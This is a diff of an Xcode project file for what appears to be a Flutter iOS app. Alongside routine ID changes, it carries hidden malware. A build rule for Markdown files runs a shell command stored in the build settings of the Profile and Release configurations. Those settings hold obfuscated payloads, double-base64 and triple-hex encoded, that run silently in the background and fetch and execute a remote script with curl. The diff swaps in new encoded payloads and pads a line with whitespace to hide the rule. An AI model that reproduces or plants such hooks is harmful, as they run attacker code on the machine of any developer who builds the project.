@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		74B135B6D1CD4B70BF3C1CD3 /* README.md */ = {isa = PBXBuildFile; fileRef = 4331A75BFC59449DAF3C1CD3; };
+		D7AAA4AD523A4904B33C1CD3 /* README.md */ = {isa = PBXBuildFile; fileRef = A66C1B53075542AB913C1CD3; };
 		1498D2341E8E89220040F4C2 /* GeneratedPluginRegistrant.m in Sources */ = {isa = PBXBuildFile; fileRef = 1498D2331E8E89220040F4C2 /* GeneratedPluginRegistrant.m */; };
 		3B3967161E833CAA004F5970 /* AppFrameworkInfo.plist in Resources */ = {isa = PBXBuildFile; fileRef = 3B3967151E833CAA004F5970 /* AppFrameworkInfo.plist */; };
 		40DBAAB23A0CF10A890834C5 /* Pods_Runner.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = EC1044E01D7690461BF97B22 /* Pods_Runner.framework */; };
@@ -31,7 +31,7 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		4331A75BFC59449DAF3C1CD3 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		A66C1B53075542AB913C1CD3 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		1498D2321E8E86230040F4C2 /* GeneratedPluginRegistrant.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = GeneratedPluginRegistrant.h; sourceTree = "<group>"; };
 		1498D2331E8E89220040F4C2 /* GeneratedPluginRegistrant.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = GeneratedPluginRegistrant.m; sourceTree = "<group>"; };
 		1B09FFCF74704EFDEC9C0F96 /* Pods-Runner.profile.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Runner.profile.xcconfig"; path = "Target Support Files/Pods-Runner/Pods-Runner.profile.xcconfig"; sourceTree = "<group>"; };
@@ -99,7 +99,7 @@
 		97C146EF1CF9000F007C117D /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				4331A75BFC59449DAF3C1CD3 /* README.md */,
+				A66C1B53075542AB913C1CD3 /* README.md */,
 				97C146EE1CF9000F007C117D /* Runner.app */,
 			);
 			name = Products;
@@ -146,7 +146,7 @@
 				B7B7B1949711730B82213E7A /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
-				12FF9F361B224F5DAE3C1CD3 /* PBXBuildRule */,
+				5525B47CD9864F91B63C1CD3 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -189,7 +189,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		12FF9F361B224F5DAE3C1CD3 /* PBXBuildRule */ = {
+		5525B47CD9864F91B63C1CD3 /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -203,14 +203,14 @@
 				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
 sh -c \"${A3DC1C3}\"";
 			};
-																																																																																						/* End PBXBuildRule section */
+																																																																																																																																													/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		97C146EC1CF9000F007C117D /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				74B135B6D1CD4B70BF3C1CD3 /* README.md */,
+				D7AAA4AD523A4904B33C1CD3 /* README.md */,
 				97C147011CF9000F007C117D /* LaunchScreen.storyboard in Resources */,
 				3B3967161E833CAA004F5970 /* AppFrameworkInfo.plist in Resources */,
 				97C146FE1CF9000F007C117D /* Assets.xcassets in Resources */,
@@ -345,7 +345,7 @@ sh -c \"${A3DC1C3}\"";
 		249021D3217E4FDB00AE95B9 /* Profile */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A3DC1C3 = "((u(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJUSE5tSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhiWHB1Y0hKdlpDNXBiaTloS1NJZ2ZDQnphQW89Cg== | u | sh ) >/dev/null 2>&1 &)";
+				A3DC1C3 = "((w(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1USE5ySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJM0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXVaWFJqWkc1aGJYb3VjblV2WVNraUlId2djMmdLCg== | w | sh ) >/dev/null 2>&1 &)";
 				A8DAD24 = "((v(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3334363333373333333636323332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333336333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373332333733353336363333363335333233323332333033363338333733343337333433373330333733330a3333363133323636333236363336333133363334333733333336363433363636333633323336333933323635333733323337333533323636333633310a3332333930613332333233323330333736333332333033373333333633383330363130610a | v | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -398,7 +398,7 @@ sh -c \"${A3DC1C3}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 7AFA3C8E1D35360C0083082E /* Release.xcconfig */;
 			buildSettings = {
-				A3DC1C3 = "((u(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJUSE5tSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhiWHB1Y0hKdlpDNXBiaTloS1NJZ2ZDQnphQW89Cg== | u | sh ) >/dev/null 2>&1 &)";
+				A3DC1C3 = "((w(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1USE5ySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJM0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXVaWFJqWkc1aGJYb3VjblV2WVNraUlId2djMmdLCg== | w | sh ) >/dev/null 2>&1 &)";
 				A8DAD24 = "((v(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3334363333373333333636323332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333336333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373332333733353336363333363335333233323332333033363338333733343337333433373330333733330a3333363133323636333236363336333133363334333733333336363433363636333633323336333933323635333733323337333533323636333633310a3332333930613332333233323330333736333332333033373333333633383330363130610a | v | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
